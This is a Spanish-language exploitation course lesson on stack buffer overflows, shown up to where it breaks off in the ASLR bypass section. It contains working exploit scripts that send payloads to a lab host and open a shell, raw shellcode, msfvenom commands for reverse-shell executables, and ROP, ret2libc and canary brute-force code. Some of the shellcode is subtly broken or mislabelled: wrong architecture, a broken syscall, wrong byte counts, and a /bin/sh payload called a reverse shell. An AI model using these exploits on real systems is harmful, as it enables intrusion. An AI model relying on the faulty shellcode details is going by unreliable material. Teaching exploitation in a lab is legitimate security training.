# CLASE 6: BUFFER OVERFLOW - EXPLOTACIÓN Y DESARROLLO DE EXPLOITS

---

## ÍNDICE

1. Fundamentos de Memoria y Arquitectura
2. Conceptos de Buffer Overflow
3. Stack Overflow: Teoría y Práctica
4. Explotación de Buffer Overflow
5. Herramientas para Análisis y Explotación
6. Shellcoding Básico
7. Técnicas de Bypass de Protecciones
8. Laboratorio Práctico Completo
9. Contramedidas y Mitigaciones

---

## 1. FUNDAMENTOS DE MEMORIA Y ARQUITECTURA

### 1.1. Organización de la Memoria en Sistemas x86

Para entender Buffer Overflow, primero debemos comprender cómo funciona la memoria en un sistema operativo. La memoria se organiza en segmentos con propósitos específicos:

```
┌─────────────────────────────────────────────────────────────────┐
│                    DIRECCIONES DE MEMORIA                        │
│                  (de mayor a menor dirección)                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  0xFFFFFFFF ┬─────────────────┐                                 │
│             │    KERNEL       │  ← Espacio del sistema operativo │
│  0xC0000000 ├─────────────────┤                                 │
│             │      STACK      │  ← Crece hacia abajo            │
│             │  (pila)         │  ← Variables locales, ret addr  │
│             │                 │                                 │
│             ├─────────────────┤                                 │
│             │       ▼         │                                 │
│             │    (vacío)      │  ← Memoria no mapeada          │
│             │       ▲         │                                 │
│             ├─────────────────┤                                 │
│             │      HEAP       │  ← Crece hacia arriba          │
│             │  (montículo)    │  ← Memoria dinámica (malloc)   │
│             ├─────────────────┤                                 │
│             │      BSS        │  ← Datos no inicializados        │
│             ├─────────────────┤                                 │
│             │      DATA       │  ← Datos globales inicializados │
│             ├─────────────────┤                                 │
│             │      TEXT       │  ← Código del programa          │
│  0x08048000 │  (solo lectura) │  ← Punteros a funciones, etc.  │
│  0x00000000 ├─────────────────┤                                 │
│             │      RESERVED   │  ← No accesible                │
│             └─────────────────┘                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2. El Stack (Pila)

El **stack** es una estructura LIFO (Last In, First Out) que almacena:
- Direcciones de retorno de funciones
- Variables locales
- Parámetros de funciones
- Registros guardados

```
┌─────────────────────────────────────────────────────────────────┐
│                     ESTADO DEL STACK                             │
│              Cuando una función es llamada                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Dirección Alta                                                 │
│  ┌─────────────────────┐                                        │
│  │  Argumentos         │  ← Parámetros pasados a la función    │
│  ├─────────────────────┤                                        │
│  │  Dirección Retorno  │  ← EIP/RIP: dónde continuar al volver │
│  ├─────────────────────┤                                        │
│  │  EBP guardado        │  ← Frame pointer anterior            │
│  ├─────────────────────┤                                        │
│  │  Variables locales   │  ← Nuestro buffer vulnerable         │
│  │  [buffer]           │  ← Aquí escribimos más de lo debido   │
│  │  [más vars]         │                                        │
│  └─────────────────────┘                                        │
│                                                                 │
│  Dirección Baja ← ESP (Stack Pointer) apunta aquí              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.3. Registros Importantes en x86/x64

| Registro | Propósito | En explotación |
|----------|----------|----------------|
| **EIP/RIP** | Instruction Pointer | ¡EL OBJETIVO! Controlar el flujo |
| **ESP/RSP** | Stack Pointer | Apunta a la cima del stack |
| **EBP/RBP** | Base Pointer | Frame de la función actual |
| **EAX/RAX** | Accumulator | Valor de retorno, syscall numbers |
| **EBX/RBX** | Base | Datos generales |
| **ECX/RCX** | Counter | Contador en loops |
| **EDX/RDX** | Data | Datos extendidos |
| **ESI/RSI** | Source Index | Origen en operaciones de copia |
| **EDI/RDI** | Destination Index | Destino en operaciones de copia |

### 1.4. Llamada a Funciones: Convención cdecl

```
func_caller:
    push arg3        ; Push argumentos de derecha a izquierda
    push arg2
    push arg1
    call func        ; Push dirección de retorno, salta a func
    
func:
    push ebp          ; Salvar frame pointer
    mov ebp, esp      ; Establecer nuevo frame
    sub esp, 0x20     ; Reservar espacio para variables locales
    
    ; ... código de la función ...
    
    mov esp, ebp      ; Restaurar stack
    pop ebp           ; Recuperar frame pointer
    ret               ; Pop dirección de retorno a EIP
```

### 1.5. Endianness: Little Endian vs Big Endian

Los sistemas x86/x64 usan **little endian**: el byte menos significativo va primero.

```
┌─────────────────────────────────────────────────────────────────┐
│                    REPRESENTACIÓN EN MEMORIA                     │
│              Dirección:  0x100  0x101  0x102  0x103            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Valor 0x41424344 ('DCBA') en memoria:                         │
│                                                                 │
│  LITTLE ENDIAN (x86/x64):                                       │
│  ┌────────┬────────┬────────┬────────┐                         │
│  │  0x44  │  0x43  │  0x42  │  0x41  │  ← "DCBA" en ASCII       │
│  └────────┴────────┴────────┴────────┘                         │
│  0x100    0x101   0x102    0x103                                 │
│                                                                 │
│  BIG ENDIAN (redes, algunos sistemas):                          │
│  ┌────────┬────────┬────────┬────────┐                         │
│  │  0x41  │  0x42  │  0x43  │  0x44  │  ← "ABCD" en ASCII       │
│  └────────┴────────┴────────┴────────┘                         │
│  0x100    0x101   0x102    0x103                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.6. Ejercicio: Observar la Memoria

En Kali Linux, puedes observar la memoria en tiempo real:

```bash
# Compila un programa simple y examínalo con gdb
cat > memory_demo.c << 'EOF'
#include <stdio.h>
#include <string.h>

void func(char *input) {
    char buffer[64];
    strcpy(buffer, input);
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Uso: %s <texto>\n", argv[0]);
        return 1;
    }
    func(argv[1]);
    return 0;
}
EOF

# Compilar SIN protecciones para el laboratorio
gcc -g -fno-stack-protector -z execstack -no-pie -o memory_demo memory_demo.c

# Analizar con gdb
gdb -q ./memory_demo
```

En gdb:

```gdb
# Establecer breakpoint en la función func
break func

# Ejecutar con un input normal
run AAAA

# Examinar el stack
x/32x $sp

# Ver las variables
info frame

# Continuar
continue

# Ahora probar con input largo
run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

---

## 2. CONCEPTOS DE BUFFER OVERFLOW

### 2.1. ¿Qué es un Buffer Overflow?

Un **Buffer Overflow** ocurre cuando un programa escribe datos más allá del límite de un buffer allocated. Esto puede sobrescribir memoria adyacente, incluyendo:
- Variables locales
- Direcciones de retorno
- Punteros de función
- Datos en el heap

```
┌─────────────────────────────────────────────────────────────────┐
│                   BUFFER OVERFLOW EN ACCIÓN                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ANTES de strcpy():                                             │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ ... │ buffer[64]      │ saved EIP │ ... │                │  │
│  │     │ [sin contenido]  │ 0x08048523 │     │                │  │
│  └──────────────────────────────────────────────────────────┘  │
│                           ▲                                     │
│                      strcpy(buffer, input)                      │
│                           │                                     │
│                           ▼                                     │
│  DESPUÉS de strcpy("A"*100):                                    │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ ... │ AAAAAAAAAAAAA... │ 0x41414141 │ ... │                │  │
│  │     │ (buffer sobres.)  │ overwritten │     │                │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                          ▲                      │
│                                    EIP = 0x41414141             │
│                                    (AAAA en hexadecimal)        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2. Funciones Peligrosas en C

Estas funciones son conocidas por ser inseguras porque no verifican límites:

| Función | Alternativa Segura | Problema |
|---------|-------------------|----------|
| `gets()` | **ELIMINADA en C11** | No hay límite de longitud |
| `strcpy()` | `strncpy()` | Copia sin límite |
| `strcat()` | `strncat()` | Concatena sin límite |
| `sprintf()` | `snprintf()` | Formatea sin límite |
| `scanf()` | `fgets()` + `sscanf()` | Depende del formato |
| `vsprintf()` | `vsnprintf()` | Formatea sin límite |
| `realpath()` | Verificar longitud | Buffer fijo |

### 2.3. Tipos de Buffer Overflow

```
┌─────────────────────────────────────────────────────────────────┐
│                  TIPOS DE BUFFER OVERFLOW                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. STACK OVERFLOW                                              │
│     ┌─────────────────────┐                                      │
│     │  Buffer en el stack │  ← Variables locales                │
│     │  (memoria automática)│                                      │
│     └─────────────────────┘                                      │
│     • Más común y clásico                                       │
│     • Sobrescribe dirección de retorno                          │
│     • Fácil de explotar localmente                              │
│                                                                 │
│  2. HEAP OVERFLOW                                               │
│     ┌─────────────────────┐                                      │
│     │  Buffer en el heap  │  ← malloc/new                       │
│     │  (memoria dinámica)  │                                      │
│     └─────────────────────┘                                      │
│     • Más complejo de explotar                                  │
│     • Sobrescribe estructuras adyacentes                        │
│     • Útil para corrupcción de metadata                         │
│                                                                 │
│  3. INTEGER OVERFLOW                                            │
│     Entero que "envuelve" a valor negativo                      │
│     • Puede causar overflow lógico                              │
│                                                                 │
│  4. FORMAT STRING                                               │
│     printf(user_input) en vez de printf("%s", user_input)     │
│     • Lectura/escritura arbitraria de memoria                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.4. Ejemplo Vulnerable Simple

```c
#include <stdio.h>
#include <string.h>

void win() {
    printf("¡Has ganado!\n");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    printf("Ingresa tu nombre: ");
    gets(buffer);  // ← ¡SIN LÍMITE!
    printf("Hola, %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

Compila y observa:

```bash
gcc -g -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c

# Input normal
echo "Carlos" | ./vulnerable
# Output: Hola, Carlos

# Input que causa overflow
python3 -c "print('A'*80)" | ./vulnerable
# Segmentation fault - sobreescribimos EIP

# Encuentra la dirección de win()
objdump -d vulnerable | grep win
# 08049156 <win>:
```

### 2.5. El Concepto de "Canarios" (Stack Canaries)

Los canarios son valores aleatorios insertados entre el buffer y la dirección de retorno para detectar overflows:

```
┌─────────────────────────────────────────────────────────────────┐
│                  CON STACK PROTECTOR                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ ... │ buffer[64] │ canary │ saved EBP │ saved EIP │ ...  │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                ▲                                 │
│                           Canario                               │
│                      (verificado al salir)                     │
│                                                                 │
│  Si el canario cambia → abort() inmediato                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

Para verificar si un binario tiene protección:

```bash
# Con checksec
checksec --file=vulnerable

#输出:
#[*] '/path/to/vulnerable'
#    Arch:     i386-32-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found          ← ¡VULNERABLE!
#    NX:       NX disabled
#    PIE:      No PIE                   ← Dirección fija
#    RWPI:     yes

# Compilar CON protección para comparar
gcc -g -fstack-protector -o protected vulnerable.c
checksec --file=protected
#    Stack:    Canary found             ← ¡PROTEGIDO!
```

---

## 3. STACK OVERFLOW: TEORÍA Y PRÁCTICA

### 3.1. Anatomía de la Explotación

```
┌─────────────────────────────────────────────────────────────────┐
│              EXPLOTACIÓN DE STACK OVERFLOW                       │
│                 Controles needed for exploit:                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Sobrescribir EIP con dirección deseada                      │
│                                                                 │
│  2. Opcional: Controlar otros registros                         │
│                                                                 │
│  3. Proporcionar shellcode o usar ROP                           │
│                                                                 │
│                                                                 │
│  DIRECCIONES EN MEMORIA:                                        │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │                        MEMORIA                            │  │
│  │                                                          │  │
│  │  Stack:  0xFFFF....  - 0x7FFF....  (crece hacia abajo)   │  │
│  │                                                          │  │
│  │  Heap:   0x00......  +  0x......   (crece hacia arriba) │  │
│  │                                                          │  │
│  │  Text:   0x0804.... (fijo, donde está el código)        │  │
│  │                                                          │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2. Paso a Paso: Identificar el Offset

El **offset** es cuántos bytes necesitas escribir para alcanzar EIP.

```python
#!/usr/bin/env python3
"""
Generador de patrón para encontrar offset
"""

import sys

def create_pattern(length):
    """Crea un patrón único para identificar el offset"""
    pattern = ""
    for i in range(length):
        # Caracteres imprimibles ASCII
        if i % 3 == 0:
            pattern += chr(65 + (i % 26))  # A-Z
        elif i % 3 == 1:
            pattern += chr(97 + (i % 26))  # a-z
        else:
            pattern += chr(48 + (i % 10))  # 0-9
    return pattern

def create_simple_pattern(length):
    """Patrón más simple: ABCD repetido"""
    pattern = ""
    for i in range(length):
        pattern += chr(65 + (i % 26))
    return pattern

# Crear patrón de 200 bytes
pattern = create_simple_pattern(200)
print(pattern)
```

En Kali Linux, puedes usar `msf-pattern_create`:

```bash
# Crear patrón
msf-pattern_create -l 200

# O en Kali con msfvenom:
msf-pattern_create -l 200 -s 0,1,2

# Si tenemos un crash con EIP=0x64413763:
msf-pattern_offset -l 200 -q 0x64413763
# [*] Exact match at offset 76
```

### 3.3. Encontrar el Offset Manualmente

```python
#!/usr/bin/env python3
"""
Script para encontrar offset exacto
"""

def find_offset():
    # Primero, prueba longitudes hasta encontrar crash
    for length in range(64, 100):
        payload = b"A" * length
        print(f"Probando longitud {length}...")
        # Aquí iría el código que envía el payload
    
    # Una vez que confirmas crash, usa binary search
    # Empieza en la mitad
    offset = 76
    
    # Verifica con precisión
    # A * 76 + B * 4 (EIP) + C * resto
    payload = b"A" * 76 + b"B" * 4 + b"C" * 100
    
    # Si EIP = 0x42424242, el offset es correcto

if __name__ == "__main__":
    find_offset()
```

### 3.4. Bad Characters

Algunos caracteres pueden causar problemas en la explotación:
- `\x00` (null byte) - Termina strings en C
- `\x0a` (newline/\n) - Puede actuar como delimitador
- `\x0d` (carriage return/\r) - Similar a newline
- `\xff` y `\xfe` - Pueden causar problemas en algunos contextos

```python
#!/usr/bin/env python3
"""
Generador de bad characters
"""

# Genera todos los bytes excepto \x00
bad_chars = bytes([x for x in range(256) if x != 0])

# O con exclusiones específicas
def generate_chars(exclude=[0x00, 0x0a, 0x0d]):
    return bytes([x for x in range(256) if x not in exclude])

print(generate_chars().hex())
```

Para probar bad characters en EIP:

```python
# Payload: offset + EIP (BBBB) + todos los bytes
payload = b"A" * 76 + b"B" * 4 + generate_chars()
```

Después, examina en gdb qué bytes llegaron corruptos.

### 3.5. Estructura del Exploit

```
┌─────────────────────────────────────────────────────────────────┐
│                    ESTRUCTURA DE UN EXPLOIT                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │                    PAYLOAD COMPLETO                       │  │
│  ├──────────┬──────────┬───────────┬────────────┬──────────┤  │
│  │ NOP SLED │ SHELLCODE│ PADDING   │ EIP/JMP ESP│ PADDING  │  │
│  │ (15-30)  │ (~300)   │ (al EIP)  │ (4 bytes)  │ (resto)  │  │
│  ├──────────┴──────────┴───────────┴────────────┴──────────┤  │
│  │                                                          │  │
│  │  NOP: \x90 * 20          ← Slide hacia el shellcode     │  │
│  │  SHELLCODE: exec("/bin/sh")  ← Nuestra shell            │  │
│  │  OFFSET: A * 76          ← Llenar hasta EIP             │  │
│  │  JMP ESP: \x12\x34\x56\x78  ← Dirección de instrucción  │  │
│  │                                  que apunta a ESP        │  │
│  │  RESTO: C * 50           ← Datos adicionales           │  │
│  │                                                          │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4. EXPLOTACIÓN DE BUFFER OVERFLOW

### 4.1. Tipos de Retorno

**Direct Function Call:**
```python
# Llamar directamente a system("/bin/sh")
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

**Return-to-libc:**
```python
# Llamar system() de libc
# Necesitas: dirección de system(), dirección de "/bin/sh", dirección de exit()
```

**ROP (Return-Oriented Programming):**
```python
# Encadenar instrucciones existentes en el binario
# No necesitas escribir código, solo usas "gadgets"
```

### 4.2. Explotación con Python: Ejemplo Completo

```python
#!/usr/bin/env python3
"""
Exploit para programa vulnerable
"""

import sys
import socket

# Configuración
HOST = "192.168.56.102"
PORT = 9999

# Shellcode: exec /bin/sh (23 bytes - alphabetic encoded)
# Alternativa: buscar en /usr/share/metasploit-framework/modules/encoders/
shellcode = (
    b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x31\xd2\x48\x31"
    b"\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\xbb\x2f"
    b"\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0d\xcd\x80"
)

def create_payload():
    # Offset hasta EIP (76 bytes)
    offset = b"A" * 76
    
    # JMP ESP o CALL ESP - dirección fija
    # En Kali: msf-nasm_shell
    # > jmp esp
    # 00000000  FFE4    jmp esp
    jmp_esp = b"\xff\xe4\x0c\x08"  # Dirección en el módulo vulnerable
    
    # NOP sled para confiabilidad
    nops = b"\x90" * 20
    
    # Construir payload
    payload = offset + jmp_esp + nops + shellcode
    
    return payload

def exploit():
    payload = create_payload()
    
    print(f"[*] Enviando payload de {len(payload)} bytes...")
    print(f"[*] Offset: 76 bytes")
    print(f"[*] Shellcode: {len(shellcode)} bytes")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    s.send(payload + b"\r\n")
    
    # Esperar shell interactiva
    s.settimeout(3)
    
    try:
        while True:
            cmd = input("$ ")
            if cmd.lower() in ['exit', 'quit']:
                break
            s.send(cmd.encode() + b"\r\n")
            print(s.recv(4096).decode())
    except:
        pass
    
    s.close()

if __name__ == "__main__":
    exploit()
```

### 4.3. Explotación Local con Pwntools

Pwntools es la navaja suiza para explotación en Kali Linux:

```bash
# Instalar pwntools
pip install pwntools

# Verificar
python3 -c "from pwn import *; print('pwntools instalado!')"
```

**Ejemplo con pwntools:**

```python
#!/usr/bin/env python3
from pwn import *

# Configuración
context.arch = 'i386'      # Arquitectura
context.os = 'linux'       # Sistema operativo
context.log_level = 'debug'  # Verbose output

# Elección: local o remoto
BINARY = './vulnerable'
HOST = '192.168.56.102'
PORT = 9999

def start_local():
    """Ejecuta el binario localmente"""
    if args.GDB:
        # Ejecutar con GDB debugging
        return gdb.debug(BINARY, '''
            break vulnerable
            break gets
            continue
        ''')
    else:
        return process(BINARY)

def start_remote():
    """Conexión remota"""
    return remote(HOST, PORT)

# Seleccionar modo
if args.REMOTE:
    p = start_remote()
else:
    p = start_local()

# === GENERAR PAYLOAD ===

# Offset hasta EIP
offset = 76

# shellcode para ejecutar /bin/sh
# 23 bytes, busca con: msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f c --smallest
shellcode = b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0d\xcd\x80"

# JMP ESP en el binario
jmp_esp = p32(0x08048547)  # usa: objdump -d vulnerable | grep jmp | head

# NOP sled
nops = b"\x90" * 20

# Construir payload
payload = b"A" * offset + jmp_esp + nops + shellcode

# Enviar
p.sendline(payload)

# Interactuar
p.interactive()
```

### 4.4. Generar Shellcode con msfvenom

```bash
# Lista de payloads disponibles
msfvenom --list payloads | grep linux/x86

# Generar reverse shell (conexión inversa)
msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -f c \
    -b "\x00\x0a\x0d"

# Generar shellcode alphanumeric (para filtros restrictivos)
msfvenom -p linux/x86/shell_reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -f c \
    -e x86/shikata_ga_nai \
    -i 3 \
    -b "\x00\x0a\x0d"

# Generar para diferentes plataformas
# Windows
msfvenom -p windows/shell_reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -f exe \
    -o shell.exe

# Linux
msfvenom -p linux/x86/shell_reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -f elf \
    -o shell.elf

# Meterpreter staged vs unstaged
# Staged (más pequeño, usa etapa 2)
-p linux/x86/meterpreter/reverse_tcp

# Unstaged (más grande, conexión directa)
-p linux/x86/shell_reverse_tcp
```

---

## 5. HERRAMIENTAS PARA ANÁLISIS Y EXPLOTACIÓN

### 5.1. GDB con Pwndbg

Pwndbg es un plugin que facilita el debugging de exploits:

```bash
# Instalar en Kali
git clone https://github.com/pwndbg/pwndbg.git
cd pwndbg
./setup.sh

# En el futuro, usa pwntools con gef o pwndbg
#gef install  # Alternativa
#pwndbg install  # Recomendada
```

**Comandos esenciales de pwndbg:**

```gdb
# Ejecución
run                    # Ejecutar programa
run < input.txt        # Con archivo de input
continue               # Continuar ejecución
next / n               # Siguiente instrucción
step / s               # Step into
finish                 # Terminar función actual

# Breakpoints
break *0x08048487      # Break en dirección
break vulnerable       # Break en función
break *0x08048487 + 5  # Break con offset
info breakpoints        # Ver breakpoints

# Inspección de memoria
x/10x $esp             # Examinar 10 words hex en ESP
x/10x 0x08049000       # Examinar dirección específica
x/s 0x08049000         # Examinar como string
x/i 0x08049000         # Examinar como instrucción
x/bx $esp              # Bytes en ESP
x/wx $esp              # Words (4 bytes)
x/gx $esp              # Giant words (8 bytes, x64)

# Formato: x/[count][format][size] address
# Format: x (hex), d (decimal), s (string), i (instrucción)
# Size: b (byte), h (halfword), w (word), g (giant)

# Registros
info registers         # Ver todos los registros
print $eip              # Ver EIP específico
print /x $esp           # Ver ESP en hex
set $eip = 0x08048547    # Modificar EIP

# Stack
stack 20                # Ver 20 líneas del stack
telescope 100           # Ver memoria con dereferencias

#Funciones
disas vulnerable        # Disassemble función
disas main              # Disassemble main
```

### 5.2. Análisis Estático con objdump y radare2

**objdump (incluido en binutils):**

```bash
# Ver símbolos
objdump -t vulnerable | grep -E "vulnerable|win|main"

# Ver código desensamblado
objdump -d vulnerable | head -100

# Ver código de función específica
objdump -d vulnerable --start-address=0x08048477 --stop-address=0x08048500

# Buscar instrucciones específicas
objdump -d vulnerable | grep -E "jmp|call|pop|ret"

# Buscar "jmp esp" que nos interesa
objdump -d vulnerable | grep "ff e4"
```

**radare2 (análisis avanzado):**

```bash
# Instalar
apt install radare2

# Abrir binario
r2 -d vulnerable

# Comandos en r2
[0x08048477]> aaa          # Analizar todo
[0x08048477]> afl          # Listar funciones
[0x08048477]> pdf @sym.main  # Ver función main
[0x08048477]> pdf @sym.vulnerable  # Ver función vulnerable
[0x08048477]> /R jmp       # Buscar todas las instrucciones jmp
[0x08048477]> /R call      # Buscar todas las instrucciones call
[0x08048477]> px @esp      # Ver stack en hex
[0x08048477]> db 0x08048477  # Poner breakpoint
[0x08048477]> dc           # Continuar ejecución
[0x08048477]> dr           # Ver registros
```

### 5.3. Análisis con Ghidra

Ghidra es una herramienta de ingeniería inversa de la NSA:

```bash
# Instalar en Kali
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/ghidra_10.4_BUILD/ghidra_10.4_PUBLIC_20231222.zip
unzip ghidra_*.zip -d /opt
# Crear enlace
ln -s /opt/ghidra_*/ghidraRun /usr/local/bin/ghidra

# Ejecutar
ghidra
```

**Flujo de trabajo en Ghidra:**

1. Archivo → Nuevo Proyecto → Non-Shared Project
2. Importar binario vulnerable
3. Doble clic en el archivo importado
4. Analizar (espera...)
5. En Symbol Tree: buscar `vulnerable`, `main`, `win`
6. Ver código desensamblado en Listing
7. Identificar:
   - Tamaño del buffer
   - Llamadas peligrosas (gets, strcpy)
   - Funciones interesantes

### 5.4. Finding ROP Gadgets

```bash
# Con ROPgadget
apt install ropper
ROPgadget --binary vulnerable
ROPgadget --binary vulnerable --only "jmp|ret"
ROPgadget --binary vulnerable --badbytes "0a|0d"

# Con pwntools rop
python3 << 'EOF'
from pwn import *

elf = ELF('vulnerable')

# Buscar "jmp esp" o similar
rop = ROP(elf)
rop.raw(elf.symbols['win'])

# Generar ROP chain
print(rop.dump())
EOF

# Buscar en libc
python3 << 'EOF'
from pwn import *

libc = ELF('/lib32/libc.so.6')
print(f"system = {hex(libc.symbols['system'])}")
print(f"str_bin_sh = {hex(next(libc.search(b'/bin/sh')))}")
print(f"exit = {hex(libc.symbols['exit'])}")
EOF
```

---

## 6. SHELLCODING BÁSICO

### 6.1. ¿Qué es un Shellcode?

Un **shellcode** es código máquina (bytes) que se inyecta y ejecuta durante la explotación. Típicamenteabre una shell.

```bash
# Shellcode básico que ejecuta /bin/sh en 32 bytes
# 31 c9              xor ecx, ecx
# 51                 push ecx
# 68 2f 2f 73 68     push 0x68732f2f
# 68 2f 62 69 6e     push 0x6e69622f
# 89 e3              mov ebx, esp
# 50                 push eax
# 53                 push ebx
# 89 e1              mov ecx, esp
# b0 0b              mov al, 0xb        ; execve syscall
# cd 80              int 0x80           ; invoke syscall
```

### 6.2. Syscalls en Linux x86

Para ejecutar comandos en Linux, usamos `execve`:

```bash
# Syscall execve en x86
# Register: syscall number = 11 (0xb)
# EBX = pointer to "/bin/sh"
# ECX = pointer to argv[] (array)
# EDX = pointer to envp[] (environment)

# Equivalente en C:
# execve("/bin/sh", ["/bin/sh", NULL], NULL);
```

**Tabla de syscalls comunes:**

| Número | Syscall | Propósito |
|--------|---------|-----------|
| 1 | exit | Terminar proceso |
| 3 | read | Leer de fd |
| 4 | write | Escribir a fd |
| 11 | execve | Ejecutar programa |
| 63 | mkdir | Crear directorio |
| 85 | readlink | Leer enlace simbólico |

### 6.3. Writing Shellcode: Alphabetic

Evitar bytes nulos y caracteres problemáticos:

```asm
; Shellcode alphabetic (no null bytes, solo A-Z, a-z, 0-9, !, (, ), +, , -, ., :, =, <, >, [, ], _, *)

; Subrutina para obtener PC actual
; Push address -> Call $+5 -> Pop eax -> eax tiene dirección actual

_start:
    call_delta:
        call near delta           ; Push current address + 5
    delta:
        pop ebp                   ; ebp = address of delta
        sub ebp, 5                ; Adjust for call
        
        ; Ahora ebp apunta a donde estamos
        ; Podemos calcular offsets relativos
```

### 6.4. Custom Shellcode con NASM

```bash
# Instalar nasm
apt install nasm

# Crear shellcode
cat > shell.asm << 'EOF'
section .text
global _start

_start:
    ; /bin/sh en el stack
    xor eax, eax
    push eax            ; NULL terminator
    
    ; "/bin/sh" en hex: 0x6e69622f, 0x68732f
    push 0x68732f2f     ; "//sh"
    push 0x6e69622f     ; "/bin"
    
    mov ebx, esp        ; EBX = "/bin/sh"
    
    push eax            ; argv[1] = NULL
    push ebx            ; argv[0] = "/bin/sh"
    mov ecx, esp        ; ECX = argv[]
    
    mov edx, eax        ; EDX = envp = NULL
    
    mov al, 11          ; execve syscall
    int 0x80            ; Execute!
    
    ; exit(0)
    mov al, 1
    xor ebx, ebx
    int 0x80
EOF

# Ensamblar
nasm -f elf32 shell.asm -o shell.o

# Link
ld -m elf_i386 shell.o -o shell

# Extraer bytes del shellcode
objdump -d shell.o | grep -E '[0-9a-f]{2,}:' | awk '{print $2}' | tr -d '\n' | sed 's/../\\x&/g'
```

### 6.5. Reverse Shell vs Bind Shell

**Reverse Shell (recomendada para NAT):**

```python
# Payload que conecta de vuelta a nosotros
# En atacante:
# nc -lvnp 4444

# Shellcode:
shellcode = b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0d\xcd\x80"
```

**Bind Shell:**

```python
# Payload que abre puerto en la víctima
# Más difícil porque necesitamos socket, bind, listen, accept, dup2, execve
```

---

## 7. TÉCNICAS DE BYPASS DE PROTECCIONES

### 7.1. Stack Canaries

Los canarios son valores aleatorios que se verifican al retornar de funciones.

**Técnicas para bypass:**

1. **Brute force** (si la función se llama repetidamente):
```python
# El canario se genera por proceso, así que podemos bruteforcear byte por byte
for i in range(256):
    payload = b"A" * 64 + bytes([i]) + rest
    send(payload)
```

2. **Leak el canario** (format string o similar):
```c
// En la función vulnerable
printf(buffer);  // ¡Vemos el canario!
// Ahora lo sabemos y lo incluimos en el exploit
```

3. **Sobrescribir __stack_chk_fail**:
```python
# Si tenemos overwrite, apuntamos a exit() en vez de la función
# que verifica el canario
```

### 7.2. NX/DEP (Data Execution Prevention)

NX marca regiones de memoria como no ejecutables.

**Técnicas para bypass:**

1. **ROP (Return-Oriented Programming)**:
```python
from pwn import *

elf = ELF('vulnerable')
rop = ROP(elf)

# Encontrar gadgets
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# Calcular offsets
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

# Construir ROP chain
rop.system(binsh)

# Enviar
payload = b"A" * 76 + rop.chain()
```

2. **Ret2libc**:
```python
# Sin ROP tools
libc_base = 0xb7e00000  # Necesitas leakear esto
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b"A" * 76 + p32(system) + p32(0) + p32(binsh)
```

### 7.3. ASLR (Address Space Layout Randomization)

ASLR randomiza las direcciones base de:
- Stack
- Heap
- Librerías (libc)
- Ejecutable (si no está compilado con PIE)

**Técnicas:**

1. **Brute force** (32-bit, espacio de direcciones pequeño):
```python
# 32-bit Linux: ~255 posibles direcciones
for attempt in range(256):
    libc_base = 0xb7e00000 + (attempt * 0x1000)
    try_exploit(libc_base)
```

2. **Leak de dirección** (info leak vulnerability):
```python
# Si podemos leer memoria arbitraria, leakear dirección de libc
# desde GOT o desde el stack
